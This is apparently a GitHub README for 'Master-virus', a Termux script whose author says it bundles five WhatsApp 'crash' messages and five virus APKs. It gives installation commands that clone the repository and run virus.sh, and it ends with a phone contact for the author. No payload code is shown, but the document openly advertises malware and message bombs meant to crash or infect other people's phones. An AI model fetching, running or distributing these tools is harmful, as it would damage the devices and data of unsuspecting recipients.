# Master-virus

#
Hi
#
its me master hack

#
This is a small tool of virus apks and crash viruses
#
In this script I haded 5 crash wha viruses and 5 virus apks
#
#

# INSTAllATION
#
apt install pv -y
#
apt install figlet -y
#
apt install ruby -y
#
gem install lolcat
#
termux-setup-storage -y
#
git clone https://github.com/DRACULA-HACK/Master-virus
#
cd Master-virus

#


bash virus.sh
#
#
# 

#
if you not enter the command chmod to executive the files
#
Created by 
MASTER-HACK
#
https://wa.me//+916235369260
